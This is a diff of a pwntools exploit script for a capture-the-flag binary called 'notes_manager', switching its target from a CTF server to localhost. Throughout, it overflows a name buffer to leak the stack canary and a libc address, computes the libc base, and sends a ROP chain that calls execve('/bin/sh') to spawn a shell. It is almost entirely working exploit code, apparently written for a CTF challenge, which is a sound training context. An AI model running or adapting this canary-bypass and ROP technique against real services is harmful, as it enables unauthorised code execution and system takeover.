@@ -6,30 +6,19 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or 'notes_manager')
+libc = ELF('./libc.so.6')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 
-# Use the specified remote libc version unless explicitly told to use the
-# local system version with the `LOCAL_LIBC` argument.
-# ./exploit.py LOCAL LOCAL_LIBC
-if args.LOCAL_LIBC:
-    libc = exe.libc
-else:
-    library_path = libcdb.download_libraries('libc.so.6')
-    if library_path:
-        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
-        libc = exe.libc
-    else:
-        libc = ELF('libc.so.6')
+
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
     if args.REMOTE:
-        return remote('tasks.ctfd.infosec.moscow', 20013)
-
+        return remote('localhost',1337)
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
@@ -51,7 +40,6 @@ continue
 # Stack:      Canary found
 # NX:         NX enabled
 # PIE:        PIE enabled
-# RUNPATH:    b'.'
 # SHSTK:      Enabled
 # IBT:        Enabled
 # Stripped:   No
@@ -59,57 +47,50 @@ continue
 
 io = start()
 
-io.sendline(b"1")
-io.recvuntil(b'Enter your name:')
-io.send(b"a" * 72 + b"b")
+io.sendline(b'1')
+sleep(1)
+io.sendline(b'a'*72)
+io.recvuntil(b"->")
+io.recvline()
+leak = io.recv(7)
+log.warn(leak.hex())
 
-io.recvuntil(b'Well... your new name! ->')
-io.recvuntil(b'aaaaaaaaaaaaab')
-canary = io.recv(7)
-log.warn(f'LEAK -> {canary}')
+io.sendline(b'1')
+io.send(b'a' * (72+8+8-1)+b'\n')
+io.recvuntil(b"->")
+io.recvline()
+an = io.recvuntil(b'Choos').replace(b'Choos', b'')
+log.warn(an)
+log.warn(f'LENGTH -> {len(an)}')
+libc_start = u64(an.ljust(8,b'\x00'))
+log.warn(f'LIBC START -> {libc_start:x}')
 
-# LIBC LEAK
-io.sendline(b"1")
-io.recvuntil(b'Enter your name:')
-io.send(b"a" * (72+8+8))
+libc.address = libc_start - 171408
+log.warn(f'LIBC -> {libc.address:x}')
 
-io.recvuntil(b'Well... your new name! ->')
-io.recvuntil(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
-leak = u64(io.recv(6).ljust(8, b'\x00'))
-libc.address = leak -171408
-log.warn(f'LEAK -> {libc.address:x}')
-
-# rop chain
 rop = ROP(libc)
-
-ret_ = rop.find_gadget(['ret'])[0]
+bin_sh = next(libc.search(b'/bin/sh\x00'))
 pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-pop_rdx = rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
+pop_rdx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
 pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
-syscall_ = rop.find_gadget(['syscall', 'ret'])[0]
 
-bin_sh = next(libc.search(b'/bin/sh'))
-log.info(f'BIN_SH {bin_sh:x}')
+syscall = rop.find_gadget(['syscall', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
 
 pl = b''
-pl += b'a' * (72)
-pl += b'\x00' + canary
-
+pl += b'a'*72
+pl += b'\x00' + leak
 pl += p64(0xdeadbeef)
-
-pl += p64(ret_)
+pl += p64(ret)
 pl += p64(pop_rax) + p64(59)
 pl += p64(pop_rdi) + p64(bin_sh)
-pl += p64(pop_rdx) + p64(0) + p64(0xcafebabe)
 pl += p64(pop_rsi) + p64(0)
-pl += p64(syscall_)
-
+pl += p64(pop_rdx) + p64(0) + p64(0)
+pl += p64(syscall)
 
 io.sendline(b'1')
 io.sendline(pl)
-sleep(4)
-io.sendline(b'0')
 
 io.interactive()
 
